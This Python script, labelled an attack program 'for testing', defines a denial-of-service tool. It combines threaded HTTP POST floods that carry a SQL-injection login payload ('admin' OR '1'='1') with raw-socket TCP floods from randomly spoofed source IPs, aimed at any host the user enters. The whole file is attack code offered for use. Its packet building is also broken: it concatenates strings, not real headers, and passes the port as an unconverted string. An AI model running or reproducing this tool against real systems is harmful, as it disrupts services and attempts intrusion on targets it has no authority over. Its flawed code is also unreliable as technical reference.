# Initial network attack python program for testing

import threading
import requests
import socket
import random
import time
from typing import Tuple

class DosAttacker:
    def __init__(self, target: str, port: int = 80, num_threads: int = 20, duration: int = 10):
        self.target = target
        self.port = port
        self.num_threads = num_threads
        self.duration = duration
        self.stop_attack = False

    def http_flooding(self):
        end_time = time.time() + self.duration
        while time.time() < end_time and not self.stop_attack:
            target_url = f"http://{self.target}/"
            try:
                response = requests.post(
                    target_url,
                    data={"username": "admin' OR '1'='1", "password": "password"},
                    timeout=2
                )
                print(f"HTTP Request sent to {target_url} - Status: {response.status_code}")
            except requests.RequestException as e:
                print(f"HTTP Request failed: {str(e)}")
            except Exception as e:
                print(f"Unexpected error in HTTP flood: {str(e)}")
            time.sleep(0.1)

    def generate_random_ip(self) -> str:
        return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

    def tcp_flood(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            end_time = time.time() + self.duration
            while time.time() < end_time and not self.stop_attack:
                src_ip = self.generate_random_ip()
                src_port = random.randint(1024, 65535)
                packet=(src_ip.encode()+self.target.encode()+src_port.to_bytes(2, 'big')+self.port.to_bytes(2, 'big')+(2).to_bytes(1, 'big'))
                try:
                    sock.sendto(packet, (self.target, self.port))
                    print(f"TCP SYN packet sent from {src_ip}:{src_port}")
                except Exception as e:
                    print(f"Failed to send TCP packet: {str(e)}")
                time.sleep(0.001)
        except Exception as e:
            print(f"Error in TCP flood: {str(e)}")
        finally:
            sock.close()

    def start_attack(self, attack_type: str = "both"):
        threads = []
        if attack_type.lower() in ["http", "both"]:
            # Start HTTP flood threads
            for _ in range(self.num_threads):
                t = threading.Thread(target=self.http_flooding)
                t.daemon = True
                threads.append(t)
                t.start()
                print(f"Started HTTP flood thread {_+1}")
        if attack_type.lower() in ["tcp", "both"]:
            # Start TCP flood threads
            for _ in range(self.num_threads):
                t = threading.Thread(target=self.tcp_flood)
                t.daemon = True
                threads.append(t)
                t.start()
                print(f"Started TCP flood thread {_+1}")

        # Wait for all threads to complete
        for t in threads:
            t.join()

    def stop(self):
        """Stop the attack"""
        self.stop_attack = True


if __name__ == "__main__":
    TARGET_HOST = "" #put target here
    TARGET_PORT = 0
    THREAD_COUNT = 10
    DURATION = 30  #sec
    
    TARGET_HOST = input("Input host IP > ")

    TARGET_PORT = input("Input host port > ")

    try:
        attacker = DosAttacker(
            target=TARGET_HOST,
            port=TARGET_PORT,
            num_threads=THREAD_COUNT,
            duration=DURATION
        )
        print(f"Starting DoS attack against {TARGET_HOST}")
        attacker.start_attack(attack_type="both")
        
    except KeyboardInterrupt:
        print("\nAttack stopped by user")
        attacker.stop()
    except Exception as e:
        print(f"Attack failed: {str(e)}")